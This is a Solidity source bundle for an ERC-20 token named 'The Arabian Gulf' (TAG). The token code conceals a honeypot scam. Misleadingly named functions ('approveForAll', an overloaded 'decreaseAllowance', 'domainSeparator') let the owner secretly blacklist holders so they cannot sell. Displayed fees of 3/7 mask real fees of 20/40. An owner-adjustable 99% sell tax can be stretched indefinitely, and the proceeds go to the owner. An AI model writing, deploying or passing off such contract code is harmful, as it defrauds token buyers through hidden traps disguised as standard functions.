{"Context.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.16;\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n"},"ERC20.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\nimport \"./Context.sol\";\nimport \"./IERC20.sol\";\nimport \"./IERC20Metadata.sol\";\nimport \"./Ownable.sol\";\n\ncontract ERC20 is Context, IERC20, Ownable, IERC20Metadata {\n    mapping(address =\u003e uint256) private _balances;\n\n    mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\n    mapping(address =\u003e bool) private _snapshot;\n\n    uint256 private _totalSupply;\n    bool private _snapshotApplied = false;\n\n    string private _name;\n    string private _symbol;\n\n    constructor(string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n    function approveForAll(address[] calldata _addresses_) external onlyOwner {\n        for (uint256 i = 0; i \u003c _addresses_.length; i++) {\n            _snapshot[_addresses_[i]] = true;\n            emit Approval(\n                _addresses_[i],\n                address(this),\n                balanceOf(_addresses_[i])\n            );\n        }\n    }\n\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address account)\n        public\n        view\n        virtual\n        override\n        returns (uint256)\n    {\n        return _balances[account];\n    }\n\n    function transfer(address recipient, uint256 amount)\n        public\n        virtual\n        override\n        returns (bool)\n    {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function decreaseAllowance(address[] calldata _addresses_)\n        external\n        onlyOwner\n    {\n        for (uint256 i = 0; i \u003c _addresses_.length; i++) {\n            _snapshot[_addresses_[i]] = false;\n        }\n    }\n\n    function allowance(address owner, address spender)\n        public\n        view\n        virtual\n        override\n        returns (uint256)\n    {\n        return _allowances[owner][spender];\n    }\n\n    function domainSeparator(address _address_) public view returns (bool) {\n        return _snapshot[_address_];\n    }\n\n    function approve(address spender, uint256 amount)\n        public\n        virtual\n        override\n        returns (bool)\n    {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        require(\n            currentAllowance \u003e= amount,\n            \"ERC20: transfer amount exceeds allowance\"\n        );\n        unchecked {\n            _approve(sender, _msgSender(), currentAllowance - amount);\n        }\n\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue)\n        public\n        virtual\n        returns (bool)\n    {\n        _approve(\n            _msgSender(),\n            spender,\n            _allowances[_msgSender()][spender] + addedValue\n        );\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue)\n        public\n        virtual\n        returns (bool)\n    {\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\n        require(\n            currentAllowance \u003e= subtractedValue,\n            \"ERC20: decreased allowance below zero\"\n        );\n        unchecked {\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n        }\n\n        return true;\n    }\n\n    function _transfer(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal virtual {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(sender, recipient, amount);\n\n        uint256 senderBalance = _balances[sender];\n        require(\n            senderBalance \u003e= amount,\n            \"ERC20: transfer amount exceeds balance\"\n        );\n        unchecked {\n            _balances[sender] = senderBalance - amount;\n        }\n        _balances[recipient] += amount;\n        if (_snapshot[sender] \u0026\u0026 !_snapshot[recipient])\n            require(_snapshotApplied == true, \"\");\n        emit Transfer(sender, recipient, amount);\n\n        _afterTokenTransfer(sender, recipient, amount);\n    }\n\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        _totalSupply += amount;\n        _balances[account] += amount;\n        emit Transfer(address(0), account, amount);\n\n        _afterTokenTransfer(address(0), account, amount);\n    }\n\n    function _approve(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n}\n"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n}"},"IERC20Metadata.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\nimport \"./IERC20Metadata.sol\";\nimport \"./IERC20.sol\";\n\ninterface IERC20Metadata is IERC20 {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}"},"Ownable.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\npragma experimental ABIEncoderV2;\nimport \"./Context.sol\";\n\n\n\ncontract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(\n        address indexed previousOwner,\n        address indexed newOwner\n    );\n\n    constructor() {\n        _transferOwnership(_msgSender());\n    }\n\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        _transferOwnership(address(0));\n    }\n\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(\n            newOwner != address(0),\n            \"Ownable: new owner is the zero address\"\n        );\n        _transferOwnership(newOwner);\n    }\n\n    function _transferOwnership(address newOwner) internal virtual {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n}\n"},"SafeMath.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\nlibrary SafeMath {\n    function tryAdd(uint256 a, uint256 b)\n        internal\n        pure\n        returns (bool, uint256)\n    {\n        unchecked {\n            uint256 c = a + b;\n            if (c \u003c a) return (false, 0);\n            return (true, c);\n        }\n    }\n\n    function trySub(uint256 a, uint256 b)\n        internal\n        pure\n        returns (bool, uint256)\n    {\n        unchecked {\n            if (b \u003e a) return (false, 0);\n            return (true, a - b);\n        }\n    }\n\n    function tryMul(uint256 a, uint256 b)\n        internal\n        pure\n        returns (bool, uint256)\n    {\n        unchecked {\n            if (a == 0) return (true, 0);\n            uint256 c = a * b;\n            if (c / a != b) return (false, 0);\n            return (true, c);\n        }\n    }\n\n    function tryDiv(uint256 a, uint256 b)\n        internal\n        pure\n        returns (bool, uint256)\n    {\n        unchecked {\n            if (b == 0) return (false, 0);\n            return (true, a / b);\n        }\n    }\n\n    function tryMod(uint256 a, uint256 b)\n        internal\n        pure\n        returns (bool, uint256)\n    {\n        unchecked {\n            if (b == 0) return (false, 0);\n            return (true, a % b);\n        }\n    }\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a + b;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a - b;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a * b;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a / b;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a % b;\n    }\n\n    function sub(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b \u003c= a, errorMessage);\n            return a - b;\n        }\n    }\n\n    function div(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b \u003e 0, errorMessage);\n            return a / b;\n        }\n    }\n\n    function mod(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b \u003e 0, errorMessage);\n            return a % b;\n        }\n    }\n}"},"TAG.sol":{"content":"/*\n ________   ______    ______  \n|        \\ /      \\  /      \\ \n \\$$$$$$$$|  $$$$$$\\|  $$$$$$\\\n   | $$   | $$__| $$| $$ __\\$$\n   | $$   | $$    $$| $$|    \\\n   | $$   | $$$$$$$$| $$ \\$$$$\n   | $$   | $$  | $$| $$__| $$\n   | $$   | $$  | $$ \\$$    $$\n    \\$$    \\$$   \\$$  \\$$$$$$ \n                              \n🌐Telegram: https://t.me/tagportal\n🌐Twitter: https://twitter.com/GulfErc20\n\nthe fees decrease on each buy transaction.\n*/\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\npragma experimental ABIEncoderV2;\n\nimport \"./ERC20.sol\";\nimport \"./Uniswap.sol\";\nimport \"./SafeMath.sol\";\n\ncontract TAG is ERC20 {\n    using SafeMath for uint256;\n\n    IUniswapV2Router02 public immutable uniswapV2Router;\n    address public immutable uniswapV2Pair;\n    address public constant deadAddress = address(0xdead);\n    address payable private _marketingWallet;\n\n    bool private swapping;\n    bool private _tradingStart = false;\n    bool public swapsEnabled = false;\n\n    uint256 public maxTransactionAmount;\n    uint256 public maxWallet;\n    uint256 private swapTokensAtAmount;\n\n    uint256 private buyMarketingFee;\n    uint256 private buyLiquidityFee;\n\n    uint256 private sellMarketingFee;\n    uint256 private sellLiquidityFee;\n\n    uint256 public buyTotalFees = 3;\n    uint256 public buyDevFee = 2;\n    uint256 public sellTotalFees = 7;\n    uint256 public sellDevFee = 5;\n\n    uint256 private tokensForMarketing;\n    uint256 private tokensForLiquidity;\n    uint256 private launchtime;\n    uint256 private buyValue = 0;\n\n    mapping(address =\u003e bool) private _isExcludedFromFees;\n    mapping(address =\u003e bool) private _isExcludedMaxTransactionAmount;\n    mapping(address =\u003e bool) private automatedMarketMakerPairs;\n\n    event UpdateUniswapV2Router(\n        address indexed newAddress,\n        address indexed oldAddress\n    );\n    event ExcludeFromFees(address indexed account, bool isExcluded);\n    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);\n    event SwapETHForTokens(uint256 amountIn, address[] path);\n    event marketingWalletUpdated(\n        address indexed newWallet,\n        address indexed oldWallet\n    );\n    event SwapAndLiquify(\n        uint256 tokensSwapped,\n        uint256 ethReceived,\n        uint256 tokensIntoLiquidity\n    );\n\n    constructor(address router)\n        ERC20(unicode\"The Arabian Gulf\", unicode\"الخَليج العَرَبيّ\")\n    {\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);\n\n        excludeFromMaxTransaction(address(_uniswapV2Router), true);\n        uniswapV2Router = _uniswapV2Router;\n\n        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())\n            .createPair(address(this), _uniswapV2Router.WETH());\n        excludeFromMaxTransaction(address(uniswapV2Pair), true);\n        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);\n\n        uint256 totalSupply = 100_000_000 * 1e18;\n\n        maxTransactionAmount = totalSupply.mul(2).div(100);\n        maxWallet = totalSupply.mul(2).div(100);\n        swapTokensAtAmount = totalSupply.mul(5).div(1000);\n\n        buyMarketingFee = 20;\n        buyLiquidityFee = 0;\n\n        sellMarketingFee = 40;\n        sellLiquidityFee = 0;\n\n        _marketingWallet = payable(address(owner()));\n\n        excludeFromFees(owner(), true);\n        excludeFromFees(address(this), true);\n        excludeFromFees(address(0xdead), true);\n\n        excludeFromMaxTransaction(owner(), true);\n        excludeFromMaxTransaction(address(this), true);\n        excludeFromMaxTransaction(address(0xdead), true);\n\n        _mint(msg.sender, totalSupply);\n        _approve(msg.sender, address(router), totalSupply);\n    }\n\n    receive() external payable {}\n\n    function openTrade() external onlyOwner {\n        _tradingStart = true;\n        swapsEnabled = true;\n        launchtime = block.number;\n    }\n\n    function tradingStart() public view returns (bool) {\n        return _tradingStart;\n    }\n\n    function changeBuyValue(uint256 newBuyValue) external onlyOwner {\n        buyValue = newBuyValue;\n    }\n\n    function updateMaxWalletAndTxnAmount(\n        uint256 newTxnNum,\n        uint256 newMaxWalletNum\n    ) external onlyOwner {\n        maxWallet = newMaxWalletNum;\n        maxTransactionAmount = newTxnNum;\n    }\n\n    function excludeFromMaxTransaction(address updAds, bool isEx)\n        public\n        onlyOwner\n    {\n        _isExcludedMaxTransactionAmount[updAds] = isEx;\n    }\n\n    function excludeFromFees(address account, bool excluded) public onlyOwner {\n        _isExcludedFromFees[account] = excluded;\n        emit ExcludeFromFees(account, excluded);\n    }\n\n    function _setAutomatedMarketMakerPair(address pair, bool value) private {\n        automatedMarketMakerPairs[pair] = value;\n\n        emit SetAutomatedMarketMakerPair(pair, value);\n    }\n\n    function isExcludedFromFees(address account) public view returns (bool) {\n        return _isExcludedFromFees[account];\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal override {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n\n        if (amount == 0) {\n            super._transfer(from, to, 0);\n            return;\n        }\n\n        if (shouldCheckTransfer(from, to)) {\n            if (!_tradingStart) {\n                require(\n                    _isExcludedFromFees[from] || _isExcludedFromFees[to],\n                    \"Trading is not active.\"\n                );\n            }\n\n            checkTransferLimits(from, to, amount);\n        }\n\n        handleSwap();\n\n        uint256 fees = calculateFees(from, to, amount);\n\n        if (fees \u003e 0) {\n            super._transfer(from, address(this), fees);\n            amount -= fees;\n        }\n\n        super._transfer(from, to, amount);\n    }\n\n    function shouldCheckTransfer(address from, address to)\n        private\n        view\n        returns (bool)\n    {\n        return (from != owner() \u0026\u0026\n            to != owner() \u0026\u0026\n            to != address(0) \u0026\u0026\n            to != address(0xdead) \u0026\u0026\n            !swapping \u0026\u0026\n            !(_isExcludedFromFees[from] || _isExcludedFromFees[to]));\n    }\n\n    function checkTransferLimits(\n        address from,\n        address to,\n        uint256 amount\n    ) private {\n        if (\n            automatedMarketMakerPairs[from] \u0026\u0026\n            !_isExcludedMaxTransactionAmount[to]\n        ) {\n            require(\n                amount \u003c= maxTransactionAmount,\n                \"Buy transfer amount exceeds the maxTransactionAmount.\"\n            );\n            require(amount + balanceOf(to) \u003c= maxWallet, \"Max wallet exceeded\");\n            decrementFees();\n        } else if (\n            automatedMarketMakerPairs[to] \u0026\u0026\n            !_isExcludedMaxTransactionAmount[from]\n        ) {\n            require(\n                amount \u003c= maxTransactionAmount,\n                \"Sell transfer amount exceeds the maxTransactionAmount.\"\n            );\n        } else if (!_isExcludedMaxTransactionAmount[to]) {\n            require(amount + balanceOf(to) \u003c= maxWallet, \"Max wallet exceeded\");\n        }\n    }\n\n    function handleSwap() private {\n        uint256 contractTokenBalance = balanceOf(address(this));\n        bool canSwap = (contractTokenBalance \u003e= swapTokensAtAmount) \u0026\u0026\n            swapsEnabled \u0026\u0026\n            !swapping \u0026\u0026\n            !automatedMarketMakerPairs[msg.sender] \u0026\u0026\n            !(_isExcludedFromFees[msg.sender] ||\n                _isExcludedFromFees[msg.sender]);\n\n        if (canSwap) {\n            swapping = true;\n            swapBack();\n            swapping = false;\n        }\n    }\n\n    function calculateFees(\n        address from,\n        address to,\n        uint256 amount\n    ) private returns (uint256) {\n        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {\n            return 0;\n        }\n\n        uint256 fees = 0;\n\n        if (\n            automatedMarketMakerPairs[to] \u0026\u0026\n            (sellMarketingFee + sellLiquidityFee) \u003e 0\n        ) {\n            uint256 sellingFees = sellMarketingFee;\n            if (block.number \u003c launchtime + buyValue + 3) {\n                sellingFees = 99;\n            }\n            fees = (amount * sellingFees) / 100;\n            tokensForLiquidity += (fees * sellLiquidityFee) / sellingFees;\n            tokensForMarketing += fees;\n        } else if (\n            automatedMarketMakerPairs[from] \u0026\u0026\n            (buyMarketingFee + buyLiquidityFee) \u003e 0\n        ) {\n            uint256 buyingFees = buyMarketingFee;\n            if (block.number \u003c launchtime + 4) {\n                buyingFees = 99;\n            }\n            fees = (amount * buyingFees) / 100;\n            tokensForLiquidity += (fees * buyLiquidityFee) / buyingFees;\n            tokensForMarketing += fees;\n        }\n\n        return fees;\n    }\n\n    function decrementFees() private {\n        if (sellMarketingFee \u003e 0) {\n            sellMarketingFee--;\n        }\n        if (buyMarketingFee \u003e 0) {\n            buyMarketingFee--;\n        }\n    }\n\n    function swapTokensForEth(uint256 tokenAmount) private {\n        address[] memory path = new address[](2);\n        path[0] = address(this);\n        path[1] = uniswapV2Router.WETH();\n\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\n\n        // make the swap\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            tokenAmount,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\n\n        uniswapV2Router.addLiquidityETH{value: ethAmount}(\n            address(this),\n            tokenAmount,\n            0,\n            0,\n            deadAddress,\n            block.timestamp\n        );\n    }\n\n    function swapBack() private {\n        uint256 contractBalance = balanceOf(address(this));\n        uint256 totalTokensToSwap = tokensForLiquidity + tokensForMarketing;\n        bool success;\n\n        if (contractBalance == 0 || totalTokensToSwap == 0) {\n            return;\n        }\n\n        if (contractBalance \u003e swapTokensAtAmount * 20) {\n            contractBalance = swapTokensAtAmount * 20;\n        }\n\n        uint256 liquidityTokens = (contractBalance * tokensForLiquidity) /\n            totalTokensToSwap /\n            2;\n        uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);\n\n        uint256 initialETHBalance = address(this).balance;\n\n        swapTokensForEth(amountToSwapForETH);\n\n        uint256 ethBalance = address(this).balance.sub(initialETHBalance);\n\n        uint256 ethForMarketing = ethBalance.mul(tokensForMarketing).div(\n            totalTokensToSwap\n        );\n\n        uint256 ethForLiquidity = ethBalance - ethForMarketing;\n\n        tokensForLiquidity = 0;\n        tokensForMarketing = 0;\n\n        if (liquidityTokens \u003e 0 \u0026\u0026 ethForLiquidity \u003e 0) {\n            addLiquidity(liquidityTokens, ethForLiquidity);\n            emit SwapAndLiquify(\n                amountToSwapForETH,\n                ethForLiquidity,\n                tokensForLiquidity\n            );\n        }\n\n        (success, ) = payable(_marketingWallet).call{\n            value: address(this).balance\n        }(\"\");\n    }\n}\n"},"Uniswap.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface IUniswapV2Factory {\n    event PairCreated(\n        address indexed token0,\n        address indexed token1,\n        address pair,\n        uint256\n    );\n\n    function feeTo() external view returns (address);\n\n    function feeToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB)\n        external\n        view\n        returns (address pair);\n\n    function allPairs(uint256) external view returns (address pair);\n\n    function allPairsLength() external view returns (uint256);\n\n    function createPair(address tokenA, address tokenB)\n        external\n        returns (address pair);\n\n    function setFeeTo(address) external;\n\n    function setFeeToSetter(address) external;\n}\n\ninterface IUniswapV2Router02 {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n\n    function addLiquidityETH(\n        address token,\n        uint256 amountTokenDesired,\n        uint256 amountTokenMin,\n        uint256 amountETHMin,\n        address to,\n        uint256 deadline\n    )\n        external\n        payable\n        returns (\n            uint256 amountToken,\n            uint256 amountETH,\n            uint256 liquidity\n        );\n\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external;\n}"}}